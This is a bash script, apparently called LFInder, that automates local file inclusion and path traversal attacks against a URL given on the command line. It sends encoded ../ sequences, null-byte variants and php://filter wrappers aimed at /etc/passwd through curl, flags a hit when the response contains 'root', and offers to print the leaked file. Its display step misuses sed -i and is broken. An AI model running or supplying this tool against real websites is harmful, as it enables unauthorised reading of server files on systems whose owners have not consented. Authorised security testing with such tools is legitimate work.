#!/bin/bash

RED='\033[1;31m'
GREEN='\033[1;32m'
NC='\033[0m'
BLUE='\033[1;34m'


found=false;

echo -e "${BLUE}\r\n\r\n"
echo "        __     ______ ____            __           "
echo "       / /    / ____//  _/____   ____/ /___   _____ "
echo "      / /    / /_    / / / __ \ / __  // _ \ / ___/ "
echo "     / /___ / __/  _/ / / / / // /_/ //  __// /     "
echo "    /_____//_/    /___//_/ /_/ \__,_/ \___//_/      "
echo -e "${NC}"

if [ "$#" -ne 1 ]; then
	echo "Illegal number of parameters"
	echo ""
	echo "Use mode: $0 http://url.com/index.php?parameter="
    exit
fi

Payloads=("../../../../../etc/passwd" "../../../../../etc/passwd%00" "../../../../../etc/passwd%2500" "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd" "%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd")
Payloads+=("Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==" "../\../\../\../\../\etc/\passwd" "..\/..\/..\/..\/..\/etc\/passwd" "./..//./..//./..//./..//./..//./..//etc//passwd");
Payloads+=("php://filter/resource=/etc/passwd" "php://filter/resource=../../../../../../etc/passwd" "php://filter/read=string.rot13/resource=/etc/passwd" "php://filter/convert.base64-encode/resource=/etc/passwd");

echo -e "${BLUE} \r\n\r\nTESTING PAYLOADS ...\r\n\r\n"

for index in ${!Payloads[@]};
do

	request=$(curl "$1${Payloads[$index]}" 2>/dev/null);
	if [[ $request == *"root"* ]]; then
		echo -n -e "${GREEN} PAYLOAD:\t\""; echo -n "${Payloads[$index]}"; echo -e "\"\t\tSUCCESS!!!!!\t[+]\r\n";

		if [ "$found" = false ]; then

			printf "${BLUE}\r\n\r\n SHOW  RESULTS?? [Y/N]${NC}"
			read response;
			echo -e "${NC}\r\n"

			if [ $response == "y" ] || [ $response == "Y" ]; then
				passwd=$( sed -i 's/ /\\r\\n/g' "$request");
				echo "$passwd";
			fi;

			printf "${BLUE} KEEP TESTING PAYLOADS?? [Y/N]"
			read keepTrying;
			if [  $keepTrying == "y" ] || [ $keepTrying == "Y" ]; then
				echo "";
			else
				exit;

			fi
		fi
		found=true;
	else

		echo -e "${RED} PAYLOAD:\t\"${Payloads[$index]}\"\t\tFAILED :/  [-]\r\n"; 
	fi
	sleep 1;
done

exit;
